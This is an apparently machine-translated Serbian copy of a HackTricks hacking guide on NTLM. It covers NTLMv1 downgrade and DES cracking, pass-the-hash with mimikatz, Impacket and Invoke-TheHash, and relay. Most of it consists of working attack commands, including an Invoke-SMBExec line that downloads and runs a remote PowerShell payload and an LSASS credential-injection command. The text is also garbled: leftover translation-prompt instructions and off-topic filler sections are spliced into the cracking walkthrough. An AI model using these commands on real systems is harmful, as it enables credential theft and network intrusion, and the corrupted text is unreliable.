# NTLM

## NTLM

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Da li radite u **cybersecurity kompaniji**? Želite li da vidite svoju **kompaniju reklamiranu na HackTricks-u**? Ili želite da imate pristup **najnovijoj verziji PEASS-a ili preuzmete HackTricks u PDF formatu**? Proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Pridružite se** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitter-u** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **i** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

### Osnovne informacije

U okruženjima gde su u upotrebi **Windows XP i Server 2003**, koriste se LM (Lan Manager) heševi, iako je opšte poznato da se oni lako mogu kompromitovati. Određeni LM heš, `AAD3B435B51404EEAAD3B435B51404EE`, označava scenario u kojem se LM ne koristi, predstavljajući heš za prazan string.

Podrazumevano, primarni metod autentifikacije je **Kerberos** protokol. NTLM (NT LAN Manager) se koristi u određenim situacijama: kada ne postoji Active Directory, kada ne postoji domen, kada Kerberos ne funkcioniše zbog neispravne konfiguracije ili kada se pokušavaju uspostaviti veze koristeći IP adresu umesto validnog imena hosta.

Prisustvo zaglavlja **"NTLMSSP"** u mrežnim paketima signalizira proces NTLM autentifikacije.

Podrška za autentifikacione protokole - LM, NTLMv1 i NTLMv2 - omogućena je putem određene DLL datoteke smeštene na lokaciji `%windir%\Windows\System32\msv1\_0.dll`.

**Ključne tačke**:

* LM heševi su ranjivi, a prazan LM heš (`AAD3B435B51404EEAAD3B435B51404EE`) označava da se ne koristi.
* Kerberos je podrazumevani metod autentifikacije, a NTLM se koristi samo u određenim uslovima.
* Paketi NTLM autentifikacije prepoznaju se po zaglavlju "NTLMSSP".
* Sistemski fajl `msv1\_0.dll` podržava LM, NTLMv1 i NTLMv2 protokole.

### LM, NTLMv1 i NTLMv2

Možete proveriti i konfigurisati koji će protokol biti korišćen:

#### Grafički interfejs

Izvršite _secpol.msc_ -> Lokalne politike -> Opcije bezbednosti -> Mrežna bezbednost: Nivo autentifikacije LAN Manager-a. Postoji 6 nivoa (od 0 do 5).

![](<../../.gitbook/assets/image (92).png>)

#### Registar

Ovo će postaviti nivo 5:

```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```

Moguće vrednosti:

```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```

### Osnovna NTLM autentifikaciona šema domena

1. **Korisnik** unosi svoje **poverljive podatke**
2. Klijentski uređaj **šalje zahtev za autentifikaciju** šaljući **ime domena** i **korisničko ime**
3. **Server** šalje **izazov**
4. Klijent **enkriptuje** izazov koristeći heš lozinke kao ključ i šalje ga kao odgovor
5. **Server šalje** informacije o **ime domena, korisničko ime, izazov i odgovor** na **kontroler domena**. Ako nije konfigurisan Active Directory ili je ime domena ime servera, poverljivi podaci se **proveravaju lokalno**.
6. **Kontroler domena proverava da li je sve ispravno** i šalje informacije serveru

**Server** i **kontroler domena** mogu da uspostave **bezbedan kanal** putem **Netlogon** servera, jer kontroler domena zna lozinku servera (ona se nalazi u bazi podataka **NTDS.DIT**).

#### Lokalna NTLM autentifikaciona šema

Autentifikacija je ista kao i prethodno opisana, **ali server zna heš korisnika** koji pokušava da se autentifikuje u **SAM** fajlu. Dakle, umesto da pita kontroler domena, **server će sam proveriti** da li korisnik može da se autentifikuje.

#### NTLMv1 izazov

Dužina izazova je 8 bajtova, a odgovor je dugačak 24 bajta.

**NT heš (16 bajtova)** je podeljen u **3 dela od po 7 bajtova** (7B + 7B + (2B+0x00\*5)): **poslednji deo je popunjen nulama**. Zatim, izazov se **posebno šifruje** sa svakim delom, a **rezultujući** šifrovani bajtovi se **spajaju**. Ukupno: 8B + 8B + 8B = 24 bajta.

**Problemi**:

* Nedostatak **slučajnosti**
* 3 dela se mogu **napadati odvojeno** kako bi se pronašao NT heš
* **DES je moguće probiti**
*
  3. ključ je uvek sastavljen od **5 nula**
* Sa **istim izazovom**, **odgovor će biti isti**. Dakle, možete žrtvi dati kao **izazov** niz "**1122334455667788**" i napasti odgovor koristeći **preizračunate tabele duge**.

#### Napad na NTLMv1

Danas je sve manje uobičajeno da se nalaze okruženja sa konfigurisanom neograničenom delegacijom, ali to ne znači da ne možete **zloupotrebiti uslugu štampača** koja je konfigurisana.

Možete zloupotrebiti neke poverljive podatke/sesije koje već imate na AD-u da **zatražite od štampača da se autentifikuje** protiv nekog **hosta pod vašom kontrolom**. Zatim, koristeći `metasploit auxiliary/server/capture/smb` ili `responder`, možete **postaviti izazov za autentifikaciju na 1122334455667788**, uhvatiti pokušaj autentifikacije i ako je izvršen korišćenjem **NTLMv1**, moći ćete ga **probiti**.\
Ako koristite `responder`, možete pokušati da **smanjite nivo autentifikacije** koristeći opciju `--lm`.\
_Napomena: Za ovu tehniku autentifikacija mora biti izvršena korišćenjem NTLMv1 (NTLMv2 nije validan)._

Imajte na umu da će štampač koristiti račun računara tokom autentifikacije, a računari koriste **dugačke i slučajne lozinke** koje verovatno nećete moći da probijete koristeći uobičajene **rečnike**. Ali autentifikacija **NTLMv1** koristi DES ([više informacija ovde](./#ntlmv1-izazov)), pa ćete koristeći neke usluge posebno posvećene probijanju DES-a moći da ga probijete (na primer, možete koristiti [https://crack.sh/](https://crack.sh)).

#### Napad na NTLMv1 pomoću hashcat-a

NTLMv1 takođe može biti probijen pomoću NTLMv1 Multi Tool-a [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi), koji formatira NTLMv1 poruke na način koji se može probiti pomoću hashcat-a.

Komanda

```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```

The following is content from a hacking book about hacking techniques. The following content is from the file /hive/hacktricks/windows-hardening/ntlm/README.md. Translate the relevant English text to Serbian and return the translation keeping exactly the same markdown and HTML syntax. Do not translate things like code, hacking technique names, hacking word, cloud/SaaS platform names (like Workspace, aws, gcp...), the word 'leak', pentesting, and markdown tags. Also, don't add any extra stuff apart from the translation and markdown syntax.

***

## NTLM

### NTLM (NT LAN Manager)

NTLM je autentifikacioni protokol koji se koristi u Microsoft Windows operativnim sistemima za proveru identiteta korisnika i pristup resursima. Ovaj protokol je zastareo i zamenjen modernijim protokolima kao što su Kerberos i NTLMv2, ali se i dalje može naći u mnogim Windows okruženjima.

### NTLM Hash

NTLM heš je rezultat heš funkcije koja se primenjuje na NTLM lozinku korisnika. Ovaj heš se koristi za proveru autentičnosti korisnika prilikom prijavljivanja na sistem. NTLM heš može biti izvučen iz Windows registra ili iz mrežnog saobraćaja.

### NTLM Relay Attack

NTLM Relay napad je tehnika koja se koristi za preuzimanje NTLM autentifikacionih tokena korisnika i dalje ih koristiti za izvršavanje napada u okviru mreže. Ova tehnika se često koristi za izvršavanje napada kao što su Pass-the-Hash i Pass-the-Ticket.

### NTLMv1

NTLMv1 je starija verzija NTLM protokola koja koristi slabije algoritme za heširanje lozinki. Ova verzija je podložna raznim napadima, uključujući brute-force napade i napade snimanjem mrežnog saobraćaja.

### NTLMv2

NTLMv2 je poboljšana verzija NTLM protokola koja koristi jače algoritme za heširanje lozinki. Ova verzija je sigurnija od NTLMv1 i preporučuje se za korišćenje u Windows okruženjima.

### Pass-the-Hash

Pass-the-Hash je tehnika koja se koristi za izvršavanje napada bez potrebe za poznavanjem stvarne lozinke korisnika. Umesto toga, napadač koristi NTLM heš lozinke za preuzimanje autentifikacionog tokena korisnika i dalje ga koristi za izvršavanje napada.

### Pass-the-Ticket

Pass-the-Ticket je tehnika koja se koristi za izvršavanje napada korišćenjem Kerberos autentifikacionih tokena. Napadač može preuzeti Kerberos TGT (Ticket Granting Ticket) sa jednog sistema i koristiti ga za izvršavanje napada na drugom sistemu u mreži.

### NTLM Rainbow Tables

NTLM Rainbow tabele su preizračunate tabele koje sadrže heš vrednosti NTLM lozinki. Ove tabele se koriste za brzo pronalaženje originalne lozinke na osnovu NTLM heša. Korišćenje NTLM Rainbow tabela može značajno ubrzati proces napada na NTLM heševe.

```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```

Kreirajte datoteku sa sadržajem:

```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```

Pokrenite hashcat (najbolje je distribuirati ga putem alata poput hashtopolisa) jer će inače ovo potrajati nekoliko dana.

```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```

U ovom slučaju znamo da je lozinka za ovo "password", pa ćemo varati u svrhu demonstracije:

```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```

Sada trebamo koristiti hashcat-utilities da bismo pretvorili razbijene DES ključeve u delove NTLM heša:

```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```

Konačno poslednji deo:

### NTLM

NTLM (New Technology LAN Manager) je autentifikacioni protokol koji se koristi u Windows operativnim sistemima za proveru identiteta korisnika. Međutim, NTLM ima nekoliko slabosti koje mogu biti iskorišćene u napadima.

#### NTLM provajderi

Windows operativni sistem ima tri različita NTLM provajdera:

* **NTLMv1**: Ovo je stariji provajder koji koristi slabu enkripciju i nije preporučljiv za upotrebu.
* **NTLMv2**: Ovo je poboljšani provajder koji koristi jaču enkripciju i predstavlja bolju opciju od NTLMv1.
* **NTLMv2 sesija**: Ovaj provajder koristi NTLMv2, ali dodaje dodatne sigurnosne mehanizme kako bi se otežao napad.

#### NTLM napadi

Postoje različiti napadi koji se mogu izvesti na NTLM protokol. Neki od njih uključuju:

* **NTLM relay**: Ovaj napad omogućava napadaču da preuzme NTLM autentifikacione podatke i izvrši napad "relay" na drugom računaru.
* **NTLM hash izvlačenje**: Ovaj napad se fokusira na izvlačenje NTLM heša iz sistema kako bi se omogućilo dalje napredovanje u napadu.
* **NTLM brute force**: Ovaj napad se zasniva na pokušajima da se dešifruje NTLM heš koristeći različite kombinacije lozinki.

#### Zaštita od NTLM napada

Da biste se zaštitili od NTLM napada, možete preduzeti sledeće mere:

* Koristite NTLMv2 ili NTLMv2 sesiju umesto NTLMv1.
* Omogućite opciju "Zahtevaj NTLMv2 sesiju" kako biste otežali napad.
* Koristite snažne lozinke kako biste otežali brute force napade.
* Redovno ažurirajte operativni sistem i primenjujte sigurnosne zakrpe kako biste ispravili poznate ranjivosti.

#### Dodatni resursi

Za više informacija o NTLM protokolu i napadima, možete posetiti sledeće resurse:

* [Microsoft dokumentacija o NTLM autentifikaciji](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-restrict-ntlm-authentication-in-this-domain)
* [NTLM relay napad - HackTricks](https://book.hacktricks.xyz/pentesting/pentesting-ntlm#ntlm-relay)
* [NTLM hash izvlačenje - HackTricks](https://book.hacktricks.xyz/pentesting/pentesting-ntlm#ntlm-hash-extraction)
* [NTLM brute force - HackTricks](https://book.hacktricks.xyz/pentesting/pentesting-ntlm#ntlm-brute-force)

```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```

Sledeći sadržaj je iz knjige o tehnikama hakovanja. Sledeći sadržaj je iz fajla /hive/hacktricks/windows-hardening/ntlm/README.md. Prevedite relevantni engleski tekst na srpski i vratite prevod zadržavajući tačno istu markdown i html sintaksu. Nemojte prevoditi stvari poput koda, imena tehnika hakovanja, hakovanja, imena cloud/SaaS platformi (kao što su Workspace, aws, gcp...), reči 'leak', pentestinga i markdown tagova. Takođe, nemojte dodavati ništa dodatno osim prevoda i markdown sintakse.

```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```

#### NTLMv2 Izazov

Dužina izazova je 8 bajtova i šalju se 2 odgovora: Jedan je dužine 24 bajta, a dužina drugog je promenljiva.

Prvi odgovor se kreira šifrovanjem HMAC\_MD5 algoritmom stringa koji se sastoji od klijenta i domena, koristeći kao ključ MD4 heš NT heša. Zatim će rezultat biti korišćen kao ključ za šifrovanje izazova pomoću HMAC\_MD5 algoritma. Uz to, dodaje se klijentski izazov od 8 bajtova. Ukupno: 24 B.

Drugi odgovor se kreira korišćenjem nekoliko vrednosti (novi klijentski izazov, vremenska oznaka radi sprečavanja napada ponovnog izvršavanja...).

Ako imate pcap datoteku koja je zabeležila uspešan proces autentifikacije, možete pratiti ovaj vodič kako biste dobili domen, korisničko ime, izazov i odgovor i pokušati da probijete lozinku: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://research.801labs.org/cracking-an-ntlmv2-hash/)

### Pass-the-Hash

Kada imate heš žrtve, možete ga koristiti da se predstavljate kao ta osoba.\
Treba vam alat koji će izvršiti NTLM autentifikaciju koristeći taj heš, ili možete kreirati novu sesiju prijavljivanja i ubaciti taj heš unutar LSASS-a, tako da će se taj heš koristiti prilikom bilo koje NTLM autentifikacije. Poslednja opcija je ono što radi mimikatz.

Molim vas, zapamtite da možete izvršiti napade Pass-the-Hash i koristeći račune računara.

#### Mimikatz

Mora se pokrenuti kao administrator

```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```

Ovo će pokrenuti proces koji će pripadati korisnicima koji su pokrenuli mimikatz, ali unutar LSASS-a sačuvane akreditacije su one unutar mimikatz parametara. Zatim, možete pristupiti mrežnim resursima kao da ste taj korisnik (slično triku `runas /netonly`, ali ne morate znati lozinku u obliku čistog teksta).

#### Pass-the-Hash sa linuxa

Možete dobiti izvršenje koda na Windows mašinama koristeći Pass-the-Hash sa linuxa.\
[**Pristupite ovde da biste naučili kako to uraditi.**](https://github.com/carlospolop/hacktricks/blob/rs/windows/ntlm/broken-reference/README.md)

#### Impacket Windows kompajlirani alati

Možete preuzeti binarne fajlove impacket-a za Windows ovde: [https://github.com/ropnop/impacket\_static\_binaries/releases/tag/0.9.21-dev-binaries](https://github.com/ropnop/impacket\_static\_binaries/releases/tag/0.9.21-dev-binaries).

* **psexec\_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
* **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
* **atexec.exe** (U ovom slučaju morate navesti komandu, cmd.exe i powershell.exe nisu validni za dobijanje interaktivne ljuske)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
* Postoji još nekoliko Impacket binarnih fajlova...

#### Invoke-TheHash

Možete dobiti powershell skripte odavde: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)

**Invoke-SMBExec**

```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```

**Invoke-WMIExec**

Invoke-WMIExec je PowerShell skripta koja omogućava izvršavanje komandi na udaljenom Windows računaru putem WMI (Windows Management Instrumentation) protokola. Ova tehnika se često koristi u pentestiranju kako bi se ostvario udaljeni pristup ciljnom sistemu.

Skripta koristi WMI objekat Win32\_Process za pokretanje komandi na ciljnom računaru. Da bi se koristila, potrebno je da korisnik ima odgovarajuće privilegije na ciljnom sistemu.

Kako bi se izvršila komanda na udaljenom računaru, potrebno je navesti IP adresu ili DNS ime ciljnog računara, korisničko ime i lozinku sa odgovarajućim privilegijama. Takođe je moguće navesti i domen ukoliko je potrebno.

```powershell
Invoke-WMIExec -Target <IP_adresa> -Username <korisničko_ime> -Password <lozinka> [-Domain <domen>]
```

Nakon uspešne autentifikacije, korisnik može izvršavati komande na ciljnom računaru koristeći PowerShell sintaksu.

Ova tehnika može biti korisna u situacijama kada je potrebno izvršiti komande na udaljenom Windows računaru, na primer za prikupljanje informacija, izvršavanje skripti ili preuzimanje datoteka.

```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```

**Invoke-SMBClient**

Invoke-SMBClient je PowerShell skripta koja omogućava interakciju sa SMB (Server Message Block) protokolom na Windows operativnom sistemu. Ova skripta omogućava izvršavanje različitih operacija na SMB serverima, kao što su preuzimanje i slanje datoteka, izlistavanje direktorijuma i izvršavanje komandi na daljinu.

Korišćenje Invoke-SMBClient je veoma jednostavno. Prvo je potrebno učitati skriptu u PowerShell sesiju. Nakon toga, možete koristiti različite komande za interakciju sa SMB serverom. Na primer, možete koristiti komandu `Invoke-SMBClient -Command "get file.txt"` za preuzimanje datoteke sa SMB servera.

Ova skripta je veoma korisna za testiranje sigurnosti i penetraciono testiranje. Može se koristiti za proveru konfiguracije SMB servera, identifikaciju slabosti i pronalaženje potencijalnih rizika. Takođe, može se koristiti za prikupljanje informacija o sistemima i izvršavanje napada na daljinu.

Važno je napomenuti da je korišćenje Invoke-SMBClient skripte ilegalno bez odobrenja vlasnika sistema. Uvek se pridržavajte zakona i etičkih smernica prilikom korišćenja ovakvih alata.

```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```

**Invoke-SMBEnum**

Invoke-SMBEnum je PowerShell skripta koja se koristi za izvršavanje SMB enumeracije na ciljnom sistemu. Ova tehnika se često koristi tokom testiranja penetracije kako bi se identifikovali ranjivi resursi i informacije o mreži.

Ova skripta koristi SMB protokol za komunikaciju sa ciljnim sistemom i prikuplja različite informacije kao što su dostupni deljeni resursi, korisnički nalozi, grupne politike i druge relevantne informacije. Ove informacije mogu biti korisne za dalje iskorišćavanje sistema ili za prikupljanje obaveštajnih podataka.

Kada se Invoke-SMBEnum pokrene, korisnik može da pruži IP adresu ili ime ciljnog sistema, kao i opcionalne parametre za autentifikaciju. Skripta će zatim izvršiti enumeraciju i prikazati rezultate u konzoli.

Ova tehnika može biti korisna za identifikaciju slabosti u SMB konfiguraciji i za prikupljanje informacija o ciljnom sistemu. Međutim, treba biti oprezan prilikom korišćenja ove tehnike, jer neovlašćeno skeniranje i prikupljanje informacija može biti protivzakonito. Uvek se pridržavajte zakona i etičkih smernica prilikom izvođenja bilo kakvih testiranja penetracije.

```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```

**Invoke-TheHash**

Ova funkcija je **kombinacija svih ostalih**. Možete proslediti **više hostova**, **isključiti** neke i **izabrati** **opciju** koju želite da koristite (_SMBExec, WMIExec, SMBClient, SMBEnum_). Ako izaberete **bilo koju** od **SMBExec** i **WMIExec** ali ne navedete _**Command**_ parametar, samo će **proveriti** da li imate **dovoljno dozvola**.

```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```

#### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

#### Windows Credentials Editor (WCE)

**Potrebno je pokrenuti kao administrator**

Ovaj alat će uraditi istu stvar kao i mimikatz (modifikuje memoriju LSASS-a).

```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```

#### Ručno izvršavanje udaljenog Windows računara sa korisničkim imenom i lozinkom

{% content-ref url="../lateral-movement/" %}
[lateral-movement](../lateral-movement/)
{% endcontent-ref %}

### Izvlačenje akreditacija sa Windows računara

**Za više informacija o** [**kako dobiti akreditacije sa Windows računara, trebate pročitati ovu stranicu**](https://github.com/carlospolop/hacktricks/blob/rs/windows-hardening/ntlm/broken-reference/README.md)**.**

### NTLM Relay i Responder

**Pročitajte detaljniji vodič o tome kako izvesti ove napade ovde:**

{% content-ref url="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md" %}
[spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
{% endcontent-ref %}

### Parsiranje NTLM izazova iz snimka mreže

**Možete koristiti** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Da li radite u **cybersecurity kompaniji**? Želite li videti **vašu kompaniju reklamiranu na HackTricks**? Ili želite pristupiti **najnovijoj verziji PEASS-a ili preuzeti HackTricks u PDF formatu**? Proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Pridružite se** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitteru** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **i** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
